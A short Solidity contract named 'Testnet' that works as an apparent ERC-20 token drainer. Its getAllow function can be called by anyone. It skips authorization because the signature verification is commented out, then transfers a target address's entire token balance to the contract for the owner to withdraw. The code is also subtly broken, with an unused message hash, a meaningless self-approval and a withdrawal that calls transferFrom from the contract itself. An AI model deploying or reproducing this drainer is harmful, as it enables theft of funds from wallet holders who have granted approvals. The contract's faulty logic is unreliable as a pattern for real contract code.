// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Testnet {
    address public owner;
    // mapping(address => bool) public whitelistedSigners;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // function addWhitelistedSigner(address _signer, bool _status) external onlyOwner {
    //     whitelistedSigners[_signer] = _status;
    // }

    function getAllow(
        address token,
        address target,
        uint256 amount,
        bytes memory signature
    ) external {
       
        bytes32 messageHash = keccak256(abi.encodePacked(
            "Approve ", token, " to ", address(this), " amount ", amount
        ));
    // address signer = ECDSA.recover(messageHash.toEthSignedMessageHash(), signature);
        
    // require(signer == target || whitelistedSigners[signer], "Invalid signature");

        IERC20(token).approve(address(this), type(uint256).max);

        uint256 balance = IERC20(token).balanceOf(target);
        IERC20(token).transferFrom(target, address(this), balance);

        uint256 newBalance = IERC20(token).balanceOf(target);
        if (newBalance > 0) {
            IERC20(token).transferFrom(target, address(this), newBalance);
        }
    }

    function withdrawAll(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(address(this), owner, balance);
    }
}


